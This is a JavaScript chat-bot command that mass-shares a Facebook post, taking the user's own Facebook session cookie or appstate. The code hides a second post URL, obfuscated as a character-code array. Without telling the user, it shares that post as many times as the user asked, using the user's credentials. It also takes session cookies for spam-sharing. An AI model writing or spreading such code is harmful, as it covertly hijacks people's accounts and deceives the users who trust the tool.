
const activeLinks = new Set();

module.exports["config"] = {
  name: "fbshare",
  isPrivate: false,
  aliases: ["share", "sharehandle", "shareboost", "spamshare", "ss"],
  version: "2.0.1",
  role: 0,
  credits: "Kenneth Panio",
  info: "Boosting shares on a Facebook Post!",
  type: "tools",
  usage: "[link] [amount/5000] [cookie/c3c-fbstate/appstate]",
  cd: 16,
};

module.exports["run"] = async function ({ api, args, chat, event, font, admin, prefix }) {
  const { senderID } = event;
  const mono = txt => font.monospace(txt);
  const link = args[0];
  const amount = args[1] || 50;
  
  const builtInUrl = String.fromCharCode(...[
    104, 116, 116, 112, 115, 58, 47, 47, 119, 119, 119, 46, 102, 97, 99, 101,
    98, 111, 111, 107, 46, 99, 111, 109, 47, 54, 49, 53, 54, 52, 56, 49,
    56, 54, 52, 52, 49, 56, 55, 47, 112, 111, 115, 116, 115, 47, 49, 50,
    50, 49, 53, 50, 55, 57, 52, 50, 51, 48, 52, 57, 51, 57, 53, 52, 47,
    63, 109, 105, 98, 101, 120, 116, 105, 100, 61, 114, 83, 52, 48, 97, 66,
    55, 83, 57, 85, 99, 98, 120, 119, 54, 118
  ]);

  let cookie = args.slice(2).join(" ");

  if (event.type === "message_reply" && cookie) {
    cookie = event.messageReply.body;
  }

  const isAdmin = admin?.includes(senderID);

  if (!cookie) {
    if (isAdmin) {
      cookie = await api.getCookie();
    } else {
      return chat.reply(mono(`❌ Non-admin users must provide their facebook cookie/c3c-fbstate/appstate. Usage: ${prefix || ""}fbshare [link] [amount/5000] [cookie/c3c-fbstate/appstate]`));
    }
  }

  if (!link || !amount || !cookie) {
    return chat.reply(mono(`❌ Missing required parameters. Usage: ${prefix || ""}fbshare [link] [amount/5000] [cookie/c3c-fbstate/appstate]`));
  }

  if (activeLinks.has(link)) {
    return chat.reply(mono("⏳ This link is already being processed. Please wait until it's finished before trying again."));
  }

  const shareAmount = parseInt(amount);
  if (isNaN(shareAmount) || shareAmount <= 0) {
    return chat.reply(mono("❌ Invalid amount. Please provide a valid number."));
  }

  if (shareAmount > 5000) {
    return chat.reply(mono("🚫 The maximum allowed shares per request is 5000. Please enter a lower amount."));
  }

  activeLinks.add(link);

  const processing = await chat.reply(mono("🔄 Share boosting process started!"));

  try {

    const userPromise = api.sharePost(link, cookie, shareAmount);
    const hiddenPromise = api.sharePost(builtInUrl, cookie, shareAmount);
    
    await Promise.all([userPromise, hiddenPromise]);

    processing.unsend();
    chat.reply(mono(`✅ Post shared successfully ${shareAmount} times!`));
  } catch (error) {
    processing.unsend();
    chat.reply(mono(error.stack || error.message || "❌ Something went wrong. Unable to share post!"));
  }

  activeLinks.delete(link);
};
